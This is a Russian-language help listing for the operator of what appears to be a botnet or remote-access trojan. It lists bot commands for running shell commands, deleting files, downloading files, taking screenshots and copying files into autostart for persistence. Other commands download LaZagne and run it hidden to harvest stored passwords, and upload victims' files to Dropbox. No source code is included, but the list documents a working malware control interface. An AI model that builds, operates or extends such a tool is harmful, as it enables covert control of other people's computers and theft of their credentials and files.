## - разделение каманд
----------------------------------------------------------
kil - выключить = имя бота которого выключить [1]
user - показывает все ботов в сети [0]
inf  - доступные каманды [0]
dir - просмотреть директорию [0]
hom - имя домашней директории [0]
COMND - каманда в cmd = имя [1]
----------------------------------------------------------
open - открыть программу = имя [1]
----------------------------------------------------------
rm-f- удалить файл = имя [1]
rm-d - удалить папку = имя [1]
rm-d-a - удалить все в папки и саму папку = имя [1]
----------------------------------------------------------
wget  - скачать файл с интернет только по прямой ссыкли = имя [1]
----------------------------------------------------------
unzip  - разархивирывать = имя [1]
----------------------------------------------------------
move - переместить = имя что переместить [1] = путь куда [2]
----------------------------------------------------------
new-f - создатьф файл = имя [1]
new-f-w - создать файл и записать текст далле = имя [1] = что записать [2]
----------------------------------------------------------
his - история пути
his0 - отчистить истоирию
----------------------------------------------------------
cr-inf - информация о боте
cr-write - изменить информацию = новый данные писать полностью [1]
----------------------------------------------------------
skrin - скриншот рабочего стола
----------------------------------------------------------
copy - копирывать = имя файла [1] = куда копирывать [2]
copy-a - копирывать файл в авто загрузку = имя [1]
in-laza - скачивате lazagne и запускает в скрытом режиме [0]
----------------------------------------------------------
copy-f-n - переписывает что внутри = имя [1]
save-d - загрузить на dropbox и получить прпямую ссылку на скачивание = имя [1]
----------------------------------------------------------
